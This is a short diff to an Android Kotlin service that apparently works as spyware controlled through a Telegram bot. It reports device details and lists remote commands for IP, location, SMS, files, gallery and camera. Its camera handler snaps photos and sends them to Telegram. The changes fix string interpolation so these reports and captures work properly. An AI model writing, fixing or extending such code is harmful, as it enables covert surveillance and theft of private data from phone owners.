@@ -61,13 +61,13 @@ class DeviceService : Service() {
         val id = DeviceIdentity(this)
         val code = id.code()
         val name = id.name()
-        val label = "<b>[\$name]</b>\n"
+        val label = "<b>[$name]</b>\n"
 
         delay(1500)
         TelegramApi.sendMessage(
             label + "🟢 online\n" +
-            "Model: \${Build.MANUFACTURER} \${Build.MODEL}\n" +
-            "Android: \${Build.VERSION.RELEASE}\n" +
+            "Model: ${Build.MANUFACTURER} ${Build.MODEL}\n" +
+            "Android: ${Build.VERSION.RELEASE}\n" +
             "Commands: /info /ip /loc /sms /files /gallery /cam /help"
         )
 
@@ -134,9 +134,9 @@ class DeviceService : Service() {
             cmd.startsWith("/cam") -> {
                 val bytes = runBlocking { CameraSnap.capture(this) }
                 if (bytes == null) TelegramApi.sendMessage(label + "camera fail")
-                else TelegramApi.sendPhoto(bytes, label + "cam \${System.currentTimeMillis()}")
+                else TelegramApi.sendPhoto(bytes, label + "cam ${System.currentTimeMillis()}")
             }
-            else -> TelegramApi.sendMessage(label + "unknown: \$cmd")
+            else -> TelegramApi.sendMessage(label + "unknown: $cmd")
         }
     }
 
